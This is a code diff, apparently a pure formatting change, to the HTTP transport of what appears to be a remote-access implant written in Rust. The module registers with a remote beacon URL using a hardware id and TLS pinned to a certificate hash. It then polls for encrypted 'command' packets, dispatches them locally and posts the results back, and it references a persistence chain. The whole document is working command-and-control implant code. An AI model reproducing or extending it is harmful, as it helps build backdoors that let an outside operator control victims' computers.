@@ -8,11 +8,11 @@ use std::sync::Arc;
 use std::time::Duration;
 use tokio::time::sleep;
 
+use super::tls::PinnedCertVerifier;
 use crate::checkin;
 use crate::config::Config;
 use crate::dispatcher::Dispatcher;
 use crate::persistence::PersistenceChain;
-use super::tls::PinnedCertVerifier;
 
 pub struct HttpTransport {
     client: reqwest::Client,
@@ -25,13 +25,14 @@ pub struct HttpTransport {
 
 impl HttpTransport {
     pub async fn connect(config: &Config) -> Result<Self> {
-        let verifier = Arc::new(PinnedCertVerifier { expected_hash: config.cert_hash });
-        let rustls_cfg = rustls::ClientConfig::builder_with_protocol_versions(
-            &[&rustls::version::TLS13],
-        )
-        .dangerous()
-        .with_custom_certificate_verifier(verifier)
-        .with_no_client_auth();
+        let verifier = Arc::new(PinnedCertVerifier {
+            expected_hash: config.cert_hash,
+        });
+        let rustls_cfg =
+            rustls::ClientConfig::builder_with_protocol_versions(&[&rustls::version::TLS13])
+                .dangerous()
+                .with_custom_certificate_verifier(verifier)
+                .with_no_client_auth();
 
         let client = reqwest::Client::builder()
             .use_preconfigured_tls(rustls_cfg)
@@ -54,18 +55,26 @@ impl HttpTransport {
 
     async fn post_packet(&self, packet: &Packet) -> Result<Option<Packet>> {
         let ct = oxide_shared::encrypt_stateless(&self.key, &serde_json::to_vec(packet)?);
-        let resp = self.client.post(&self.beacon_url)
+        let resp = self
+            .client
+            .post(&self.beacon_url)
             .body(ct)
             .header("Content-Type", "application/octet-stream")
-            .send().await.context("beacon POST")?;
+            .send()
+            .await
+            .context("beacon POST")?;
 
         let status = resp.status();
-        if status == reqwest::StatusCode::NO_CONTENT { return Ok(None); }
+        if status == reqwest::StatusCode::NO_CONTENT {
+            return Ok(None);
+        }
         anyhow::ensure!(status.is_success(), "beacon error: {status}");
         let body = resp.bytes().await.context("read response")?;
         let plain = oxide_shared::decrypt_stateless(&self.key, &body)
             .map_err(|e| anyhow!("decrypt: {e:?}"))?;
-        Ok(Some(serde_json::from_slice(&plain).context("parse packet")?))
+        Ok(Some(
+            serde_json::from_slice(&plain).context("parse packet")?,
+        ))
     }
 
     fn jittered_secs(&self) -> f64 {
@@ -77,20 +86,30 @@ impl HttpTransport {
         // Check-in
         let checkin_pkt = checkin::build_checkin_packet(&chain.check_all());
         self.hwid = checkin_pkt.data["hwid"].as_str().unwrap_or("").to_string();
-        let ack = self.post_packet(&checkin_pkt).await?
+        let ack = self
+            .post_packet(&checkin_pkt)
+            .await?
             .ok_or_else(|| anyhow!("no checkin_ack"))?;
-        eprintln!("[+] HTTP registered, session: {}", ack.data["session_id"].as_str().unwrap_or("?"));
+        eprintln!(
+            "[+] HTTP registered, session: {}",
+            ack.data["session_id"].as_str().unwrap_or("?")
+        );
 
         // Beacon loop — drain command queue on each iteration
         loop {
             let hb = Packet::new("heartbeat", serde_json::json!({"hwid": self.hwid}));
             let mut next = self.post_packet(&hb).await?;
             while let Some(pkt) = next {
-                if pkt.packet_type != "command" { break; }
+                if pkt.packet_type != "command" {
+                    break;
+                }
                 let mut resp = dispatch.dispatch(&pkt);
                 // HTTP mode is stateless — server needs hwid in every packet
                 if let Some(obj) = resp.data.as_object_mut() {
-                    obj.insert("hwid".to_string(), serde_json::Value::String(self.hwid.clone()));
+                    obj.insert(
+                        "hwid".to_string(),
+                        serde_json::Value::String(self.hwid.clone()),
+                    );
                 }
                 next = self.post_packet(&resp).await?;
             }
